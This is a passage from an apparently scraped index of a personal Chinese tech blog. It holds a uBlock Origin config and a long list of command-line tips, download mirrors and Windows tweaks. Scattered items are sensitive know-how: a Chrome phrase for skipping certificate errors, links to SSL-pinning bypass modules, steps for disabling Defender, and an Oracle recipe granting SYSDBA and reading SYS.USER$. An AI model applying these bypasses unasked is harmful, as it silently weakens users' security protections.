\u0026#34;autoUpdate\u0026#34;: true, \u0026#34;cloudStorageEnabled\u0026#34;: true, \u0026#34;collapseBlocked\u0026#34;: true, \u0026#34;colorBlindFriendly\u0026#34;: false, \u0026#34;contextMenuEnabled\u0026#34;: true, \u0026#34;dynamicFilteringEnabled\u0026#34;: true, \u0026#34;externalLists\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;firewallPaneMinimized\u0026#34;: true, \u0026#34;hyperlinkAuditingDisabled\u0026#34;: true, \u0026#34;ignoreGenericCosmeticFilters\u0026#34;: false, \u0026#34;largeMediaSize\u0026#34;: 50, \u0026#34;parseAllABPHideFilters\u0026#34;: true, \u0026#34;prefetchingDisabled\u0026#34;: true, \u0026#34;requestLogMaxEntries\u0026#34;: 1000, \u0026#34;showIconBadge\u0026#34;: true, \u0026#34;tooltipsDisabled\u0026#34;: false, \u0026#34;webrtcIPAddressHidden\u0026#34;: true }, \u0026#34;selectedFilterLists\u0026#34;: [ \u0026#34;CHN-0\u0026#34;, \u0026#34;CHN-1\u0026#34;, \u0026#34;plowe-0\u0026#34;, \u0026#34;easyprivacy\u0026#34;, \u0026#34;easylist\u0026#34;, \u0026#34;user-filters\u0026#34;, \u0026#34;ublock-unbreak\u0026#34;, \u0026#34;ublock-abuse\u0026#34;, \u0026#34;ublock-privacy\u0026#34;, \u0026#34;ublock-experimental\u0026#34;, \u0026#34;ublock-badware\u0026#34;, \u0026#34;ublock-annoyances\u0026#34;, \u0026#34;ublock-filters\u0026#34; ], \u0026#34;hiddenSettings\u0026#34;: { \u0026#34;assetFetchTimeout\u0026#34;: 30, \u0026#34;autoUpdateAssetFetchPeriod\u0026#34;: 120, \u0026#34;autoUpdatePeriod\u0026#34;: 7, \u0026#34;ignoreRedirectFilters\u0026#34;: false, \u0026#34;ignoreScriptInjectFilters\u0026#34;: false, \u0026#34;manualUpdateAssetFetchPeriod\u0026#34;: 500, \u0026#34;popupFontSize\u0026#34;: \u0026#34;unset\u0026#34;, \u0026#34;suspendTabsUntilReady\u0026#34;: false, \u0026#34;userResourcesLocation\u0026#34;: \u0026#34;unset\u0026#34; }, \u0026#34;netWhitelist\u0026#34;: \u0026#34;127.0.0.1\\n192.168.1.1\\nabout-scheme\\nchrome-extension-scheme\\nchrome-scheme\\nlocalhost\\nloopconversation.about-scheme\\nmoz-extension-scheme\\nopera-scheme\\nvivaldi-scheme\\nxhstormr.tk\u0026#34;, \u0026#34;dynamicFilteringString\u0026#34;: \u0026#34;* * inline-script block\\n* * 1p-script block\\n* * 3p-script block\\n* * 3p-frame block\\n* * image block\\n* fonts.googleapis.com * block\\n* github.com * noop\\n* imgur.com * noop\\n* sinaimg.cn * noop\\nbilibili.com bilibili.com * noop\\nbilibili.com hdslb.com * noop\\npan.baidu.com baidupcs.com * noop\\npan.baidu.com pan.baidu.com * noop\\npan.baidu.com pcsdata.baidu.com * noop\\ntranslate.google.cn google.cn * noop\\nw.mail.qq.com qq.com * noop\\nwww.imooc.com imooc.com * noop\\nzhihu.com zhihu.com * noop\\nduckduckgo.com duckduckgo.com * noop\\nzhihu.com zhimg.com * noop\\nzhihu.com vzuu.com * noop\u0026#34;, \u0026#34;urlFilteringString\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;hostnameSwitchesString\u0026#34;: \u0026#34;no-remote-fonts: * true\\nno-csp-reports: * true\\nno-remote-fonts: bilibili.com false\u0026#34;, \u0026#34;userFilters\u0026#34;: \u0026#34;\u0026#34; } ","permalink":"https://xhstormr.github.io/blog/posts/ublock-origin-filter/","summary":"","title":"uBlock Origin Filter"},{"content":"MSI msiexec.exe /a D:\\test.msi /passive TARGETDIR=D:\\dir InnoSetup test.exe /VERYSILENT /NORESTART /NOICONS /DIR=\u0026quot;D:\\dir\u0026quot; InstallShield test.exe /a /s /v\u0026quot;/passive TARGETDIR=D:\\dir test.exe /extract_all:D:\\dir SourceTree SourceTreeSetup_1.9.10.0.exe /? SourceTreeSetup_1.9.10.0.exe /extract More 7zr, innounp, lessmsi\nReference MSI, InnoSetup, InstallShield, InstallShield, InstallShield\n","permalink":"https://xhstormr.github.io/blog/posts/unpack-msi-installshield/","summary":"","title":"解包 MSI IS 文件"},{"content":"Updated on 2016-11-26\nhttp://openspeedtest.com/\nhttp://speedtest.xfinity.com/\nhttps://speed.cloudflare.com/\nhttps://www.speedtest.net/\nhttps://www.speedcheck.org/\nhttps://test.ustc.edu.cn/\n1 MB = 1024 KB 1 Mbps = 0.125 MB/S = 128 KB/S ","permalink":"https://xhstormr.github.io/blog/posts/bandwidth-speed/","summary":"","title":"带宽测速"},{"content":" 特殊符号 特殊符号： ·⊙①◎Θ⊙●○¤㊣㈱＠の■□★☆◆◇◣◢◤◥▲△▼▽⊿◢▂▃▄▅▆▇█▉▊▋▌▍▎▏■□〓≡↑↓→←↘↙♀♂┇┅‖$@* amp;#※卍卐∞Ψ§∮№⌒＊◆◇◎●☉ 标点符号： ．。，、；：？！ˉˇ¨`~々～‖∶＂＇｀｜·…—～-〃‘’“”〝〞〔〕〈〉《》「」『』〖〗【】（）［］｛｝︻︼﹄﹃ 数学符号： ＋－×÷﹢﹣±／＝∥∠≌∽≦≧≒﹤﹥≈≡≠＝≤≥＜＞≮≯∷∶∫∮∝∞∧∨∑∏∪∩∈∵∴⊥∥∠⌒⊙√∟⊿㏒㏑％‰ 单位符号： ㎎㎏㎜㎝㎞㎡㏄㏎㏑㏒㏕℡％‰℃℉°′″＄￡￥￠♂♀℅ 数字序号： ①②③④⑤⑥⑦⑧⑨⑩㈠㈡㈢㈣㈤㈥㈦㈧㈨㈩№⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇⒈⒉⒊⒋⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛ⅠⅡⅢⅣⅤⅥⅦⅧⅨⅩⅪⅫⅰⅱⅲⅳⅴⅵⅶⅷⅸⅹ 希腊字母： ΑΒΓΔΕΖΗΘΙΚΛΜΝΞΟΠΡΣΤΥΦΧΨΩαβγδεζνξοπρσηθικλμτυφχψω 占位符号： 一　一 一\u0026amp;#8195;一 一\u0026amp;#12288;一 https://en.m.wikipedia.org/wiki/Whitespace_character ✔️ ✔ ✖️ ✖ ❌ http://emojipedia.org/heavy-check-mark/ http://emojipedia.org/heavy-multiplication-x/ http://emojipedia.org/cross-mark/ DOTA2 启动： -novid -console -high 控制台： net_graph 1 dota_disable_range_finder 0 纯 UEFI 模式下转换 GPT 格式 1. BIOS 设置中启动项关闭兼容模式 2. 插入 Win8 启动盘后，出现第一个\u0026#34;下一步\u0026#34;，按shift+f10调出命令对话框 3. 输入 diskpart 4. 输入 select disk 0 5. 输入 clean 6. 输入 convert gpt 到这里就可以关闭命令对话框，按下一步进行正常的分区设置了，系统会自动分出三个区用于UEFI的启动。 GPU \u0026amp; CPU 天梯表 http://malu.me/gpu/ http://malu.me/cpu/ DNS OpenDNS: 208.67.222.222 208.67.220.220 https://doh.pub/dns-query https://doh.360.cn/dns-query https://dns11.quad9.net/dns-query 磁盘分区空间量设置 100 G： 100 * 1024 + 615 = 103015 Git-GUI \u0026#34;D:\\Download\\PortableGit-MSysGit\\bin\\wish.exe D:/Download/PortableGit-MSysGit/libexec/git-core/git-gui\u0026#34; Clevo mirror BIOS： https://repo.palkeo.com/clevo-mirror/ DRIVERS： https://www.sagernotebook.com/drivers.php?cat=580 VPN http://www.ipmana.com/ https://github.com/openconnect/openconnect ---- echo \u0026#39;123456\u0026#39; | sudo openconnect --juniper --background --syslog --passwd-on-stdin --script=/etc/vpnc/vpnc-script.in --user=123 --authgroup=教师组 https://sslvpn.fudan.edu.cn/ https://github.com/OpenVPN/openvpn ---- openvpn --config client13.ovpn --auth-user-pass 123.txt ---- username userpass 无界 无界： https://ultrasurf.us/index.html 自由： https://dongtaiwang.com/loc/download.en.php 汇总： https://forums.internetfreedom.org/index.php?wap2 Psiphon： https://psiphon.ca/zh/download.html https://psiphon3.com/zh/download.html lantern： https://getlantern.org 在线输入法（书签） javascript:void(document.body.appendChild(document.createElement(\u0026#39;script\u0026#39;)).src=\u0026#39;https://www.baidu.com/olime/bdime_open.js\u0026#39;) Firefox https://ftp.mozilla.org/pub/firefox/ https://download-origin.cdn.mozilla.net/pub/firefox/ https://download-installer.cdn.mozilla.net/pub/firefox/ Server（Win） Apache： https://www.apachehaus.com/cgi-bin/download.plx Nginx： https://nginx.org/en/download.html Caddy： https://github.com/mholt/caddy/releases/latest Serv-U： https://support.solarwinds.com/Success_Center/Serv-U_Managed_File_Transfer_Serv-U_FTP_Server/release_notes https://downloads.solarwinds.com/solarwinds/Release/SU/15.1.6/SU-FTP-Server-Windows-v15.1.6.zip 目录索引 Nginx： nginx.exe -s reload nginx.exe -s quit ---- http or server 中写入： autoindex on; autoindex_localtime on; autoindex_exact_size off; access_log off; ---- https://nginxconfig.io/ Caddy： Caddy.exe -host 0.0.0.0 -port 80 \u0026#34;browse / ./1.txt\u0026#34; \u0026#34;gzip\u0026#34; \u0026#34;log stdout\u0026#34; \u0026#34;errors stdout\u0026#34; \u0026#34;header / -Server\u0026#34; \u0026#34;root .\u0026#34; ---- Browse Template： https://github.com/mholt/caddy/blob/master/caddyhttp/browse/setup.go#L116 善用佳软 游览器：Chrome 播放器：MPC-BE 下载器：Aria2 清系统：CCleaner 解压缩：7-Zip 看图片：IrfanView 输入法：华宇拼音输入法 Aria2 Curl Wget 代理下载 Curl： https://curl.haxx.se/download.html#Win64 curl -x socks5h://127.0.0.1:1080 www.baidu.com curl -Oku XhstormR:123456 \u0026#34;sftp://127.0.0.1/d/download/123.txt\u0026#34; curl -u \u0026#34;KEY:SECRET\u0026#34; --aws-sigv4 \u0026#34;aws:amz:us-west-004:s3\u0026#34; \u0026#34;https://\u0026lt;MY_BUCKET_NAME\u0026gt;.s3.us-west-004.backblazeb2.com/123.txt\u0026#34; curl -u \u0026#34;KEY:SECRET\u0026#34; --aws-sigv4 \u0026#34;aws:amz:auto:s3\u0026#34; \u0026#34;https://\u0026lt;ACCOUNT_ID\u0026gt;.r2.cloudflarestorage.com/\u0026lt;MY_BUCKET_NAME\u0026gt;/123.txt\u0026#34; Wget： https://eternallybored.org/misc/wget/current/wget.exe wget -e \u0026#34;http_proxy=10.34.3.71:808\u0026#34; www.baidu.com Aria2： https://github.com/aria2/aria2/releases/latest aria2c --all-proxy=\u0026#34;10.34.3.71:808\u0026#34; -s16 -x16 -k1M http://www.baidu.com/ Wget 镜像网站 @ curl -so 123.html http://pdf7.tarena.com.cn/tts8_source/ttsPage/VIP/VIP_ESD00/index/mytts.html @ busybox sed -i ^ -e \u0026#34;s/http:\\/\\/tts8.tmooc.cn\\/ttsPage\\//http:\\/\\/pdf7.tarena.com.cn\\/tts8_source\\/ttsPage\\//g\u0026#34; ^ -e \u0026#34;s/\\/EXERCISE\\/01\\/index.html/\\/EXERCISE\\/01\\/index_answer.html/g\u0026#34; ^ 123.html @ wget ^ --mirror ^ --continue ^ --convert-links ^ --page-requisites ^ --adjust-extension ^ --no-parent ^ --no-verbose ^ --no-if-modified-since ^ --reject=js,css ^ --local-encoding=UTF-8 ^ --output-file=123.log ^ --directory-prefix=123 ^ --span-hosts --domains=pdf7.tarena.com.cn ^ --input-file=123.html --force-html http://pdf7.tarena.com.cn/tts8_source/ttsPage/WEB/WEB_V05/index/mytts.html http://pdf7.tarena.com.cn/tts8_source/ttsPage/EMBED/ESD_V05/index/mytts.html http://pdf7.tarena.com.cn/tts8_source/ttsPage/LINUX/NSD_V05/index/mytts.html http://pdf7.tarena.com.cn/tts8_source/ttsPage/JAVA/JSD_V05/index/mytts.html https://www.gnu.org/software/wget/manual/wget.html Xshell \u0026amp; Xftp Xshell：保持活动状态 -\u0026gt; 字符串 -\u0026gt; 0 \\n Video Download youtube-dl：（FFmpeg 自动合并） https://yt-dl.org/downloads/latest/ youtube-dl.exe --proxy socks5://127.0.0.1:1080 -F URL youtube-dl.exe --proxy socks5://127.0.0.1:1080 -f 137+140 URL you-get： https://github.com/soimort/you-get/releases/latest Bilibili： http://www.bilibilijj.com/DownLoad/Cid/10143543 Andy\u0026#39;s FLV Joiner：（FLV 合并） http://www.videohelp.com/download/FLVJoin0.6.zip yamdi：（FLV 关键帧） https://sourceforge.net/projects/yamdi/files/ yamdi -i src.flv -o dst.flv XML to ASS：（弹幕转字幕） https://tiansh.github.io/us-danmaku/bilibili/ https://danmu2ass.codeplex.com/releases Chrome CSS 正则排除网址：((?!localhost|xhstormr.tk).)* a{text-decoration:none !important} a:hover { text-decoration: underline !important;} *:not([class*=\u0026#34;icon\u0026#34;]):not(i){font-family: \u0026#34;Microsoft YaHei\u0026#34;,\u0026#34;Symbol\u0026#34; !important;} Chrome User Agent iPhone： --User-Agent=\u0026#34;Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X; en-us) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53\u0026#34; Android： --User-Agent=\u0026#34;Mozilla/5.0 (Linux; Android 5.1.1; Nexus 6 Build/LYZ28E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2403.20 Mobile Safari/537.36\u0026#34; Windows： --User-Agent=\u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.2403.20 Safari/537.36 Linux Nexus\u0026#34; Chrome HSTS chrome://net-internals/#hsts 强制忽略证书错误：badidea、thisisunsafe Chrome Screenshot F12 -\u0026gt; Ctrl+Shift+P -\u0026gt; full size screenshot Search https://duckduckgo.com/?q=123 https://www.google.com/search?newwindow=1\u0026amp;q=123 https://www.google.com/ncr ---- site:example.com filetype:pdf \u0026#34;电子书没有采用专有\u0026#34; -去除关键字 ---- inurl:链接 intext:正文 intitle:标题 Hosts C:\\Windows\\System32\\drivers\\etc\\ ⇳ 64.233.189.121 feeds.feedburner.com 64.233.189.121 www.repacks.org 64.233.189.121 www.draw.io 54.231.66.16 s3.amazonaws.com 209.99.20.16 dl.dumptruck.goldenfrog.com 151.101.128.133 blog.xhstormr.tk 151.101.128.133 assets-cdn.github.com 151.101.128.133 raw.githubusercontent.com GApps https://www.apkmirror.com/apk/google-inc/google-services-framework/ https://www.apkmirror.com/apk/google-inc/google-play-services/ https://www.apkmirror.com/apk/google-inc/google-play-store/ https://github.com/MuntashirAkon/unapkm-android https://github.com/opengapps/opengapps Google（Mirrors） https://raw.githubusercontent.com/googlehosts/hosts/master/hosts-files/hosts EXE： https://en.m.wikipedia.org/wiki/Google_Chrome https://api.shuax.com/tools/getchrome https://repo.fdzh.org/chrome/exe/ - https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Android/523313/ https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/523309/ https://commondatastorage.googleapis.com/chromium-browser-snapshots/Android/LAST_CHANGE https://commondatastorage.googleapis.com/chromium-browser-snapshots/Win_x64/LAST_CHANGE - type nul \u0026gt; \u0026#34;D:\\Program Files\\Chrome\\User Data\\SwReporter\u0026#34; CRX： http://yurl.sinaapp.com/crx.php APK： https://apps.evozi.com/apk-downloader/ https://apkleecher.com/ https://m.apkpure.com/ https://www.apk4fun.com/ https://github.com/cnjackchen/my-chrome/blob/master/MyChrome.au3#L2680 https://github.com/google/omaha/blob/master/doc/ServerProtocolV3.md curl -sk -X POST https://update.googleapis.com/service/update2 -T 123.txt ⬇️ type 123.txt | curl -sk https://update.googleapis.com/service/update2 -d @- ⬇️ curl -sk https://update.googleapis.com/service/update2 -d @- \u0026lt; 123.txt ⬇️ curl -sk https://update.googleapis.com/service/update2 -d @123.txt ⬇️ curl -sk https://update.googleapis.com/service/update2 -d @123.txt | xmllint --format -o 123.xml - 123.txt ⇳ \u0026lt;request protocol=\u0026#34;3.0\u0026#34; installsource=\u0026#34;update3web-ondemand\u0026#34;\u0026gt; \u0026lt;os platform=\u0026#34;win\u0026#34; version=\u0026#34;10.0.14393.693\u0026#34; arch=\u0026#34;x64\u0026#34;/\u0026gt; \u0026lt;app appid=\u0026#34;{8A69D345-D564-463C-AFF1-A69D9E530F96}\u0026#34; ap=\u0026#34;x64-stable-multi-chrome\u0026#34;\u0026gt; \u0026lt;updatecheck/\u0026gt; \u0026lt;/app\u0026gt; \u0026lt;app appid=\u0026#34;{8A69D345-D564-463C-AFF1-A69D9E530F96}\u0026#34; ap=\u0026#34;x64-beta-multi-chrome\u0026#34;\u0026gt; \u0026lt;updatecheck/\u0026gt; \u0026lt;/app\u0026gt; \u0026lt;app appid=\u0026#34;{8A69D345-D564-463C-AFF1-A69D9E530F96}\u0026#34; ap=\u0026#34;x64-dev-statsdef_1\u0026#34;\u0026gt; \u0026lt;updatecheck/\u0026gt; \u0026lt;/app\u0026gt; \u0026lt;/request\u0026gt; Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\Software\\Policies\\Google\\Chrome\\ExtensionInstallSources] \u0026#34;1\u0026#34;=\u0026#34;\u0026lt;all_urls\u0026gt;\u0026#34; [HKEY_LOCAL_MACHINE\\Software\\Policies\\Google\\Chrome\\ExtensionInstallWhitelist] \u0026#34;1\u0026#34;=\u0026#34;nihdlpmjaedafkmiicoadjdlggakghmh\u0026#34; Operating System（Mirrors） MSDN： https://msdn.itellyou.cn/ https://www.microsoft.com/zh-cn/software-download/windows10ISO https://www.microsoft.com/zh-cn/download/confirmation.aspx?id=56116 https://msdn.microsoft.com/zh-cn/library/ms123401.aspx https://msdn.microsoft.com/zh-cn/subscriptions/downloads/ ---- document.getElementById(\u0026#34;DownloadsArea\u0026#34;).style.display=\u0026#34;\u0026#34;; Linux（CentOS）： https://www.centos.org/download/ https://mirrors.cqu.edu.cn/ https://mirrors.sjtug.sjtu.edu.cn/ https://mirrors.tuna.tsinghua.edu.cn/ https://mirrors.ustc.edu.cn/ https://mirrors.pku.edu.cn/Mirrors https://mirrors.hust.edu.cn/ https://mirrors.huaweicloud.com/ https://mirrors.tencent.com/ https://mirrors.163.com/ https://mirrors.sohu.com/ https://mirrors.yun-idc.com/ https://developer.aliyun.com/mirror/ https://mirror.azure.cn/ https://mirrorz.org/ RHEL： https://access.redhat.com/products/red-hat-enterprise-linux/ https://developers.redhat.com/auth/realms/rhd/account/ https://docs.microsoft.com/zh-cn/sysinternals/downloads/ ---- https://live.sysinternals.com/ https://download.sysinternals.com/files/SysinternalsSuite.zip https://launcher.nirsoft.net/downloads/ https://www.sordum.org/downloads/ https://bellard.org/tcc/ https://support.broadcom.com/group/ecx/productdownloads?subfamily=VMware%20Workstation%20Pro\u0026amp;freeDownloads=true https://support.broadcom.com/group/ecx/productdownloads?subfamily=VMware%20Fusion\u0026amp;freeDownloads=true https://releases.llvm.org/download.html https://github.com/llvm/llvm-project/releases/latest ---- clang.exe --target=x86_64-pc-windows-gnu 123.c https://prereleases.llvm.org/win-snapshots/clang-format-6923b0a7.exe https://frippery.org/files/busybox/busybox64.exe https://www.wireshark.org/download.html https://zeroturnaround.com/software/jrebel/download/prev-releases/ https://www.cs.princeton.edu/~bwk/btl.mirror/index.html https://github.com/Aegisub/Aegisub/releases/latest https://www.nikse.dk/subtitleedit/online https://jcenter.bintray.com/com/google/javascript/closure-compiler/v20180402/closure-compiler-v20180402.jar https://free.nchc.org.tw/tdf/libreoffice/stable/6.0.1/win/x86_64/LibreOffice_6.0.1_Win_x64.msi https://cloud.bluestacks.com/api/getdownloadnow https://support.bluestacks.com/hc/en-us/sections/360006523831 ---- https://repo.xposed.info/module/de.robv.android.xposed.installer https://dl-xda.xposed.info/framework/ ---- https://bstweaker.tk https://play.google.com/store/apps/details?id=net.jolivier.cert.Importer https://play.google.com/store/apps/details?id=org.proxydroid https://www.proxifier.com/download/ProxifierPE.zip https://github.com/Fuzion24/JustTrustMe https://github.com/ViRb3/TrustMeAlready ---- \u0026#34;C:\\Program Files\\BlueStacks\\HD-ConfigHttpProxy.exe\u0026#34; set 192.168.2.122 8080 https://mirrors.tuna.tsinghua.edu.cn/lyx/bin/ https://mirrors.tuna.tsinghua.edu.cn/CTAN/systems/texlive/tlnet/install-tl.zip https://mirrors.tuna.tsinghua.edu.cn/virtualbox/virtualbox-Win-latest.exe https://mirrors.ustc.edu.cn/vim/pc/vim82w32.zip https://mirrors.ustc.edu.cn/kernel.org/linux/utils/boot/syslinux/syslinux-6.03.zip https://mirrors.ustc.edu.cn/eclipse/technology/epp/downloads/release/oxygen/1a/eclipse-java-oxygen-1a-win32-x86_64.zip https://mirrors.ustc.edu.cn/qtproject/official_releases/qtcreator/4.10/4.10.2/installer_source/windows_msvc2017_x64/qtcreator.7z https://mirrors.ustc.edu.cn/gimp/stable/windows/gimp-2.10.0-x64-setup.exe https://mirrors.ustc.edu.cn/kde/stable/krita/4.2.1/krita-x64-4.2.1.zip https://mirrors.ustc.edu.cn/rust-static/dist/rust-1.51.0-x86_64-pc-windows-gnu.msi https://mirrors.ustc.edu.cn/rust-static/dist/rustc-1.51.0-src.tar.gz https://mirrors.ustc.edu.cn/golang/go1.16.2.windows-amd64.zip https://mirrors.ustc.edu.cn/apache/maven/maven-3/3.5.3/binaries/apache-maven-3.5.3-bin.zip https://mirrors.ustc.edu.cn/apache/tika/tika-app-1.23.jar ---- java -jar tika-app-1.19.1.jar -h 123 \u0026gt; 123.html https://mirrors.tuna.tsinghua.edu.cn/lineage-rom/full/ ---- https://download.lineageos.org/ https://rpm.nodesource.com/pub_16.x/el/8/x86_64/nodejs-16.0.0-1nodesource.x86_64.rpm https://mirrors.huaweicloud.com/nodejs/latest/node-v16.0.0-win-x64.7z https://cdn.npm.taobao.org/yarn/-/yarn-1.22.10.tgz https://cdn.npm.taobao.org/primer-markdown/-/primer-markdown-4.0.0.tgz ---- https://registry.npm.taobao.org/ https://mirrors.huaweicloud.com/repository/npm/ ---- yarn config set registry https://registry.npm.taobao.org yarn global add test ---- npm --registry=https://registry.npm.taobao.org install -g test https://mirror.azure.cn/nginx/download/nginx-1.20.0.zip https://api.getfiddler.com/win/latest https://www.ccleaner.com/ccleaner/builds 分词词典： https://www.mdbg.net/chinese/dictionary?page=cc-cedict 世界地图： https://planet.osm.org/ https://www.openstreetmap.org/ PSP： https://www.ppsspp.org/downloads.html https://github.com/hrydgard/ppsspp https://buildbot.orphis.net/ppsspp/ ---- 模拟手柄：https://github.com/RetroPie/RetroPie-Docs/blob/master/docs/PSP-FuSa-gamepad.md PS2： http://pcsx2.net/download/releases/windows/category/40-windows.html https://github.com/PCSX2/pcsx2 https://buildbot.orphis.net/pcsx2/ PS3： https://rpcs3.net/download https://github.com/RPCS3/rpcs3 PSV： https://github.com/Vita3K/Vita3K Xbox360： https://github.com/xenia-project/xenia N64： http://www.pj64-emu.com/windows-downloads https://github.com/project64/project64 Wii U： http://cemu.info/index.html 3DS： https://github.com/citra-emu/citra Nintendo Switch： https://github.com/yuzu-emu/yuzu https://github.com/Ryujinx/Ryujinx RetroArch: https://github.com/libretro/RetroArch SQL osquery： https://github.com/facebook/osquery ---- select t1.*, t2.name from process_open_sockets t1, processes t2 where t1.pid = t2.pid order by t2.name; SQLite： https://www.sqlite.org/index.html https://github.com/xerial/sqlite-jdbc https://jcenter.bintray.com/org/xerial/sqlite-jdbc/ ---- sqlite3.exe 123.db \u0026#34;.mode column\u0026#34; \u0026#34;.header on\u0026#34; \u0026#34;select * from user;\u0026#34; \u0026gt; 1.txt ---- compile \u0026#39;org.xerial:sqlite-jdbc:+\u0026#39; MySQL： https://dev.mysql.com/downloads/mysql/ ---- mysqld --initialize-insecure mysqld mysqladmin -uroot password 123456 mysql -uroot -p123456 Oracle： http://www.oracle.com/technetwork/database/features/instant-client/index.html ---- sqlplus username/password@127.0.0.1:1521/cqsfjwdb su - oracle export ORACLE_HOME=/u01/oracle/product/11.2.0/db_1 export PATH=$PATH:$ORACLE_HOME/bin sqlplus / as sysdba CREATE USER admin IDENTIFIED BY \u0026#34;123456\u0026#34; DEFAULT TABLESPACE system; GRANT CONNECT, RESOURCE, CREATE SESSION, DBA, SYSDBA, SYSOPER TO admin; SELECT * FROM SYS.USER$ WHERE NAME = \u0026#39;ADMIN\u0026#39;; SELECT * FROM SYS.DBA_USERS WHERE USERNAME = \u0026#39;ADMIN\u0026#39;; FFmpeg ffmpeg.exe -i http://example.com/1.m3u8 -c copy 123.mkv ffplay.exe \u0026#34;http://example.com/1.m3u8\u0026#34; ffplay.exe -v -8 -t 0.5 -loop 3 -nodisp -autoexit 123.mp3 H.264： ffmpeg.exe -i 123.gif -c:v libx264 -preset medium -crf 28 -c:a aac -b:a 128k 123.mp4 H.265： ffmpeg.exe -i 123.gif -c:v libx265 -preset medium -crf 28 -c:a aac -b:a 128k 123.mp4 VP9： ffmpeg.exe -i 123.gif -c:v libvpx-vp9 -crf 45 -b:v 0 -c:a libvorbis 123.webm H.264 to RAW： ffmpeg.exe -i 123.mp4 -vcodec copy -an -bsf:v h264_mp4toannexb 123.h264 30 FPS： ffmpeg.exe -i 123.mp4 -r 30 1234.mp4 Clip Video： ffmpeg.exe -i 123.mp4 -ss 5.0 -t 3.0 1234.mp4 Watermark： ffmpeg.exe -i 123.mp4 -vf \u0026#34;drawtext=fontfile=msyh.ttc:fontsize=18:fontcolor=white:text=By XhstormR:x=10:y=10\u0026#34; 1234.mp4 Capture Video： ffmpeg.exe -f gdigrab -i desktop 123.mp4 https://ffmpeg.zeranoe.com/builds/ Win10 禁用 OneDrive、Defender 等组件 gpedit.msc -\u0026gt; 计算机配置 -\u0026gt; 管理模板 -\u0026gt; Windows 组件 -\u0026gt; OneDrive \u0026amp; Windows Defender 卸载 OneDrive： taskkill /f /im OneDrive.exe %SystemRoot%\\SysWOW64\\OneDriveSetup.exe /uninstall rd \u0026#34;%UserProfile%\\OneDrive\u0026#34; /Q /S rd \u0026#34;%LocalAppData%\\Microsoft\\OneDrive\u0026#34; /Q /S rd \u0026#34;%ProgramData%\\Microsoft OneDrive\u0026#34; /Q /S rd \u0026#34;C:\\OneDriveTemp\u0026#34; /Q /S REG Delete \u0026#34;HKEY_CLASSES_ROOT\\CLSID\\{018D5C66-4533-4307-9B53-224DE2ED1FE6}\u0026#34; /f REG Delete \u0026#34;HKEY_CLASSES_ROOT\\Wow6432Node\\CLSID\\{018D5C66-4533-4307-9B53-224DE2ED1FE6}\u0026#34; /f 禁用 Unistack 服务组： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CDP* -\u0026gt; Start = 4 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\OneSyncSvc* -\u0026gt; Start = 4 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\UserDataSvc* -\u0026gt; Start = 4 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\UnistoreSvc* -\u0026gt; Start = 4 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PimIndexMaintenanceSvc* -\u0026gt; Start = 4 - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\TimeBrokerSvc -\u0026gt; Start = 4 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\tiledatamodelsvc -\u0026gt; Start = 4 CMD 操作示例： reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\TimeBrokerSvc /v Start /t REG_DWORD /d 4 /f Win10 输入法 切换半全角：Shift+Space 切换简繁体：Ctrl+Shift+F Domain 注册：https://my.freenom.com/ 解析：https://www.cloudxns.net/ 解析：https://www.cloudflare.com/a 解析：https://my.incapsula.com/mysites Pandoc Markdown ➜ HTML： pandoc -s -o 123.html --self-contained 123.md Markdown ➜ PDF（需要 wkhtmltopdf）： pandoc -s -o 123.pdf -c file:///D:/Download/123.css -f commonmark -t html5 ^ -V papersize:a4 ^ -M pagetitle:123 ^ -B 1.txt ^ -A 2.txt ^ 123.md 123.css: primer-markdown 1.txt: \u0026lt;div class=\u0026#34;markdown-body\u0026#34;\u0026gt; 2.txt: \u0026lt;/div\u0026gt; https://github.com/jgm/pandoc https://github.com/wkhtmltopdf/wkhtmltopdf https://github.com/jgm/pandoc-templates/blob/master/default.html5 https://github.com/JetBrains/kotlin-web-site/blob/master/src/pdf.py Xpdf pdftotext -layout -nopgbrk -enc UTF-8 123.pdf - | grep 123 https://www.xpdfreader.com/pdftotext-man.html ImageMagick magick.exe convert -size 1000 123.svg 123.png svg ➜ png magick.exe convert -density 300 123.pdf 123.png pdf ➜ png magick.exe convert -extent +0+10 -crop 0x2000 123.png 456.png 分割图片 magick.exe convert -transparent white -fuzz 25% 123.png 456.png 透明图片 https://www.imagemagick.org/script/download.php#windows ---- 转换 PDF: https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/latest 将 gswin64c.exe 更名为 gs.exe 操作 PDF: https://github.com/coherentgraphics/cpdf-binaries 查看 PDF: https://mupdf.com/downloads/ https://pngquant.org/ http://advsys.net/ken/utils.htm https://sourceforge.net/projects/optipng/files/OptiPNG/ https://tinify.cn/ http://m.2gei.com/bgremover/ https://imageoptim.com/mozjpeg http://editor.method.ac/ http://127.0.0.1/draw/war/index.html?lang=zh\u0026amp;https=0\u0026amp;local=1\u0026amp;demo=1 UTF-8 with BOM (busybox printf \u0026#34;\\xEF\\xBB\\xBF\u0026#34; \u0026amp; iconv -f UTF-16 -t UTF-8 123.txt) \u0026gt; 456.txt 回车和换行 回车（CR）：\\r 换行（LF）：\\n Unix：\\n Mac ：\\r Dos ：\\r\\n FOR /R %G IN (*.md) DO 